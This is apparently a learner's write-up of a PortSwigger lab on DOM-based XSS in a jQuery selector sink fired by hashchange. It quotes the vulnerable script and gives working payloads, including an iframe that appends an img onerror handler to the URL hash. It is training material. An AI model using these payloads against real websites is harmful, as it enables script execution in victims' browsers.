# [Lab: DOM XSS in jQuery selector sink using a hashchange event](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)

## Lab

This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's `$()` selector function to auto-scroll to a given post, whose title is passed via the `location.hash` property.

To solve the lab, deliver an exploit to the victim that calls the `print()` function in their browser.

## Analysis

review source code:

```js
<script>
    $(window).on('hashchange', function(){
        var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
        if (post) post.get(0).scrollIntoView();
    });
</script>
```

- hashchange

    The `hashchange` event is fired when the fragment identifier of the URL has changed (the part of the URL beginning with and following the # symbol).

- location.hash

    The location.hash property sets or returns the anchor part of a URL, including the hash sign (#).

- Element.scrollIntoView()
    The Element interface's scrollIntoView() method scrolls the element's ancestor containers such that the element on which scrollIntoView() is called is visible to the user.

## jQuery selector exploit

```js
$('lskdjf<img src=x onerror=print()>')
```

this query execute print() function.

## Solutions

upload to exploit server:

  fail attempt:

  ```html
  <script>
  location = 'https://id.web-security-academy.net/#<img src=1 onerror=print()>'
  </script>
  ```

  success

  ```html
  <iframe src='https://id.web-security-academy.net/#' onload='this.src+="<img src=1 onerror=print()>"'></iframe>
  ```
